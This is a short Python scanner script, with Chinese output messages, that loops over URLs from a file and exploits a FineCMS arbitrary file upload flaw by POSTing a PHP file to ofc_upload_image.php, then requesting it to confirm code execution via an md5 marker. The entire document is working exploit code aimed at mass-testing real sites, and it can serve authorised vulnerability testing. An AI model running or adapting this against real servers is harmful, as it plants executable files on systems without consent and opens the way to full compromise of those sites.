
import random
import requests


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'


#重定向
for i in urls:
    url = i.rstrip("\n")
    headers = {
        "Content-Type": "application/oct",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/dayrui/libraries/Chart/ofc_upload_image.php?name="
    post_data = '''<?print(md5(1234));?>'''
    filename = "test" + str(random.randrange(1000, 9999)) + ".php"
    vulnurl = url + payload + filename
    shellpath = url + "/dayrui/libraries/tmp-upload-images/" + filename
    try:
        req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
        req2 = requests.get(shellpath, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
            print("[+]存在FineCMS任意文件上传漏洞...(高危)\t\tpayload: " + shellpath, "red")
        else:
            print("[-]不存在finecms_uploadfile漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")
